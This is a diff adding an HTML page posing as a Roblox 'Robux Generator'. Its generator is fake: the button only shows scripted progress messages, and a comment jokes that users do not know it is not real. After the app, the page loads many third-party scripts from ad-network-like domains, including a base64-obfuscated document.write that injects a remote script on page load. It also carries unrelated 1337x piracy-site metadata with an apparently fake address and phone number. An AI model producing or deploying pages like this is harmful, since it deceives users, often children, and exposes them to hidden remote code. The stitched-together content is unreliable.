@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Robux Generator</title>
+
+  <!-- Bootstrap stuff -->
+  <link
+    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
+    rel="stylesheet"
+  />
+
+  <!-- Tailwind stuff -->
+  <script>
+    tailwind = {
+      config: {
+        theme: {
+          extend: {
+            colors: {
+              rbBg: "#f2f4f5",
+              rbPanel: "#ffffff",
+              rbBorder: "#d1d5db",
+              rbText: "#111827",
+              rbMuted: "#6b7280",
+              rbBlue: "#00a2ff",
+              rbRed: "#e2231a"
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <!-- Fonts that were used originally, these were scrapped but removing it is pointless anyways -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+
+  <!-- Loads react -->
+  <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
+  <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+  <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+  <!-- Builder sans stuff -->
+  <style>
+  /* Actually wait I could implement Source Sans as a backup */
+    @font-face {
+      font-family: "Builder500";
+      src: url("https://rawcdn.githack.com/Shuiux/Roblox-Builder-Fonts/2f3b4f0bd060b79aec6e4fa71c3ec107a2fd0874/fonts/BuilderSans/BuilderSans-Medium-500.otf") format("opentype");
+       /* Archived version if it breaks: https://web.archive.org/web/20260106022202im_/https://rawcdn.githack.com/Shuiux/Roblox-Builder-Fonts/2f3b4f0bd060b79aec6e4fa71c3ec107a2fd0874/fonts/BuilderSans/BuilderSans-Medium-500.otf*/
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: "Builder700";
+      src: url("https://rawcdn.githack.com/Shuiux/Roblox-Builder-Fonts/2f3b4f0bd060b79aec6e4fa71c3ec107a2fd0874/fonts/BuilderSans/BuilderSans-Bold-700.otf") format("opentype");
+      /* Archived version if it breaks: https://web.archive.org/web/20260106022603im_/https://rawcdn.githack.com/Shuiux/Roblox-Builder-Fonts/2f3b4f0bd060b79aec6e4fa71c3ec107a2fd0874/fonts/BuilderSans/BuilderSans-Bold-700.otf */
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    body {
+      font-family: "Builder500", "Source Sans 3", system-ui, sans-serif;
+      background-color: #f2f4f5;
+      margin: 0;
+    }
+
+    .boldthingy {
+      font-family: "Builder700", "Source Sans 3" system-ui, sans-serif;
+    }
+
+    /* Basically the css for the navbar, this stuff takes too long lol */
+    .roblox-navbar {
+      height: 64px;
+      padding: 0 16px;
+      background-color: white;
+      border-bottom: 1px solid #d1d5db;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+    }
+
+    .roblox-navbar .nav-links span {
+      margin-left: 16px;
+      font-size: 0.875rem;
+      color: #6b7280;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .roblox-navbar .nav-links span:hover {
+      color: #111827;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="root" class="w-full min-h-screen flex flex-col"></div>
+  <!-- They do not know it isn't real, hehe -->
+
+  <script type="text/babel">
+    function App() {
+      const [status, setStatus] = React.useState("");
+
+      const fakeGenerate = () => {
+        const steps = [
+          "Checking account eligibility…",
+          "Verifying Robux balance…",
+          "Applying potential bonus…",
+          "Almost done…",
+          "Looks like the generator didn't work, try again."
+        ];
+
+        let i = 0;
+        setStatus("");
+
+        const interval = setInterval(() => {
+          setStatus(steps[i]);
+          i++;
+          if (i >= steps.length) clearInterval(interval);
+        }, 700);
+      };
+
+      return (
+        <>
+          {/* The HTML for the navbar */}
+          <header className="roblox-navbar">
+            <img
+              src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Roblox_Logo_2022.svg"
+              alt="Roblox"
+              className="h-6"
+            />
+            <div className="nav-links d-none d-md-flex">
+              <span>Discover</span>
+              <span>Marketplace</span>
+              <span>Create</span>
+              <span>Robux</span>
+            </div>
+          </header>
+
+          {}
+          <div className="flex-1 flex items-center justify-center">
+            <div className="w-full max-w-md px-3">
+
+             
+
+              {/* This basically is the stuff for the generator */}
+              <div className="bg-rbPanel border border-rbBorder rounded-lg p-5 shadow-lg">
+                <h1 className="fs-4 fw-bold mb-1 boldthingy text-center">
+                  Robux Generator
+                </h1>
+                <p className="text-rbMuted text-sm mb-4 text-center">
+               This generator may be shut off during certain times of day.
+                </p>
+
+                <label className="form-label fw-medium">Roblox Username</label>
+                <input
+                  placeholder="Enter username"
+                  className="form-control mb-3 text-muted"
+                />
+
+                <label className="form-label fw-medium">Robux Amount</label>
+                <select className="form-select mb-4 text-muted">
+                  <option>1,000 Robux</option>
+                  <option>10,000 Robux</option>
+                  <option>1,000,000 Robux</option>
+                </select>
+
+                <button
+                  onClick={fakeGenerate}
+                  className="btn w-100 text-white fw-semibold"
+                  style={{ backgroundColor: "#335fff" }}
+                >
+                  Generate Robux
+                </button>
+
+                {status && (
+                  <div className="mt-3 text-sm text-rbMuted text-center animate-pulse">
+                    {status}
+                  </div>
+                )}
+
+                <div className="mt-4 pt-3 border-top text-xs text-rbMuted text-center">
+This generator may not work at certain times of day.
+                </div>
+              </div>
+           </div>
+          </div>
+
+          {/* Footer */}
+          <footer className="text-center text-xs text-rbMuted py-4">
+            Not explicitly affiliated with Roblox Corp.
+          </footer>
+        </>
+      );
+    }
+
+    ReactDOM.createRoot(document.getElementById("root")).render(<App />);
+  </script>
+    <script src="/assets/js/antiad.js" type="module"></script>
+  <script src="/assets/js/easteregg.js" type="module"></script>
+	
+    
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   <script type='text/javascript' src='//fixeswavycultural.com/88/37/65/8837658487085b799326b984798a6ec9.js'></script>
+<script type='text/javascript' src='//fixeswavycultural.com/69/cf/e3/69cfe3f61eb1212ad17512e51c527133.js'></script>
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   <script>document.write(atob("PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0nLy9kZW5zdWJtYXJpbmVzdWJkdWVkLmNvbS9mMi9kOC9mNy9mMmQ4Zjc3YWZiYzU4NzkyODUzYTc3MzZjMDA4NGIyMS5qcyc+PC9zY3JpcHQ+"));</script>
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Organization",
+    "name": "1337x",
+    "url": "https://1337x-official.com/",
+    "logo": "/imgs/1337x-logo.svg",
+    "contactPoint": {
+        "@type": "ContactPoint",
+        "telephone": "+1-800-666-7890",
+        "contactType": "customer support",
+        "areaServed": "Worldwide",
+        "availableLanguage": [
+        "English", 
+        "Russian", 
+        "Japanese",
+        "Spanish",
+        "French",
+        "German",
+        "Chinese",
+        "Arabic",
+        "Hindi",
+        "Portuguese",
+        "Bengali",
+        "Punjabi",
+        "Urdu",
+        "Italian",
+        "Dutch",
+        "Korean",
+        "Turkish",
+        "Tamil",
+        "Telugu",
+        "Marathi"
+    ]
+    },
+    "email": "help@1337x-official.com",
+    "address": {
+        "@type": "PostalAddress",
+    "streetAddress": "505 Spruce Terrace",
+    "addressLocality": "Lakeside",
+    "addressRegion": "Midtown",
+    "postalCode": "89012",
+    "addressCountry": "USA"
+    },
+    "sameAs": [
+        "https://www.facebook.com/1337xofficialsite",
+        "https://twitter.com/1337xofficialsite"
+    ],
+    "foundingDate": "2007-03-13",
+    "founder": {
+        "@type": "Person",
+        "name": "Leon Leet"
+    },
+    "description": "1337x: Established as a prominent torrent directory, 1337x offers users a platform to share and access magnet links and torrent files on :: 1337x, 1337.x, 1337 x, 1337 torrent, 1337 to torrent. - 1337x Official - 1337x Series - 1337x Movies"
+}
+</script>
+
+
+
+
+<script type="application/ld+json">
+            {
+                "@context": "https://schema.org",
+                "@type": "ItemList",
+                "itemListElement": [
+                    {
+                "@type": "ListItem",
+                "position": "0",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/dicks-the-musical-2023-idvc100",
+                    "name": "Dicks: The Musical (2023)",
+                    "image": "https://1337x-official.com/imagess/dicks-the-musical.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "1",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/foe-2023-idvc100",
+                    "name": "foe (2023)",
+                    "image": "https://1337x-official.com/imagess/foe-2023.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "2",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/killers-of-the-flower-moon-2023-idvc100",
+                    "name": "Killers of the Flower Moon (2023)",
+                    "image": "https://1337x-official.com/imagess/killers-of-the-flower-moon.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "3",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/five-nights-at-freddys-2023-idvc100",
+                    "name": "Five Nights at Freddy's (2023)",
+                    "image": "https://1337x-official.com/imagess/five-nights-at-freddy-s.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "4",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/the-holdovers-2023-idvc100",
+                    "name": "The Holdovers (2023)",
+                    "image": "https://1337x-official.com/imagess/the-holdovers.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "5",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/fingernails-2023-idvc100",
+                    "name": "fingernails (2023)",
+                    "image": "https://1337x-official.com/imagess/fingernails.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "6",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/priscilla-2023-idvc100",
+                    "name": "Priscilla (2023)",
+                    "image": "https://1337x-official.com/imagess/priscilla-2023.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "7",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/pain-hustlers-2023",
+                    "name": "Pain hustlers (2023)",
+                    "image": "https://1337x-official.com/imagess/pain-hustlers.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "8",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/all-dirt-roads-taste-of-salt-2023-idvc100",
+                    "name": "All Dirt Roads Taste of Salt (2023)",
+                    "image": "https://1337x-official.com/imagess/all-dirt-roads-taste-of-salt-2023.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "9",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/rustin-2023-idvc100",
+                    "name": "Rustin (2023)",
+                    "image": "https://1337x-official.com/imagess/rustin-2023.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "10",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/sly-2023-idvc100",
+                    "name": "Sly (2023)",
+                    "image": "https://1337x-official.com/imagess/sly-2023.jpg"
+                }},{
+                "@type": "ListItem",
+                "position": "11",
+                "item": {
+                    "@type": "Movie",
+                    "url": "https://en.1337x-official.com/movies/the-killer-2023-idvc100",
+                    "name": "The Killer (2023)",
+                    "image": "https://1337x-official.com/imagess/the-killer-2023.jpg"
+                  }}
+                ]
+            }</script>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [{
+    "@type": "Question",
+    "name": "What is 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "1337x is a torrent indexing website where users can find, share, and download a variety of media content using magnet links and torrent files."
+    }
+  },{
+    "@type": "Question",
+    "name": "Is it legal to use 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "Using 1337x to search for torrents isn't inherently illegal. However, downloading or distributing copyrighted content without authorization is illegal in many countries."
+    }
+  },{
+    "@type": "Question",
+    "name": "Why might I not be able to access 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "1337x may be blocked by certain ISPs due to legal pressures or copyright infringement concerns. The website may also occasionally experience downtime."
+    }
+  },{
+    "@type": "Question",
+    "name": "Are there mirror or proxy sites for 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "Yes, there are multiple mirror and proxy sites that replicate 1337x content. However, users should be cautious, as some of these sites may carry security risks."
+    }
+  },{
+    "@type": "Question",
+    "name": "Is it safe to use mirror or proxy sites?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "Not always. While some mirror or proxy sites might be genuine, others could host malware or intrusive ads. It's essential to use caution and have updated antivirus software."
+    }
+  },{
+    "@type": "Question",
+    "name": "How can I access 1337x if it's blocked in my region?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "A common method is using a Virtual Private Network (VPN) to bypass regional restrictions and access the website while also maintaining privacy."
+    }
+  },{
+    "@type": "Question",
+    "name": "What type of content is available on 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "1337x hosts a wide range of content, including movies, TV shows, music, games, applications, and more."
+    }
+  },{
+    "@type": "Question",
+    "name": "Are there risks involved in downloading torrents from 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "Yes, like all torrent sites, there's a risk of downloading malicious files. Users should be cautious, check comments for feedback on the torrent, and always use updated antivirus software."
+    }
+  },{
+    "@type": "Question",
+    "name": "Can I face legal repercussions for using 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "If you're downloading or distributing copyrighted content without authorization, you could face legal consequences, depending on your country's copyright laws."
+    }
+  },{
+    "@type": "Question",
+    "name": "How can I ensure safety when using 1337x?",
+    "acceptedAnswer": {
+      "@type": "Answer",
+      "text": "Use a reliable VPN service. Always have updated antivirus software. Be wary of torrents from unfamiliar or suspicious uploaders. Check torrent comments for user feedback on quality and safety."
+    }
+  }]
+}
+</script>
+
+<script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=650ae7037a79f400122d655f&product=sop' async='async'></script>
+    <script type="text/javascript" src="https://1337x-official.com/js/app.js?v=1"></script>
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4739166,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+    
+    <script type="text/javascript" src="https://thepibay.site/as2xsi1xs.js"></script>
+    
+    <script>
+	if (top != self) top.location.href = location.href;
+	function setAll(){
+		t = document.forms.q.elements;
+		t.audio.checked=false;
+		t.video.checked=false;
+		t.apps.checked=false;
+		t.games.checked=false;
+		t.other.checked=false;
+	}
+	function rmAll(){ document.forms.q.elements.all.checked=false; }
+</script>
+<script>aclib.runAutoTag({zoneId: '00lkd41xg4'});</script>
+
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+</body>
+</html>
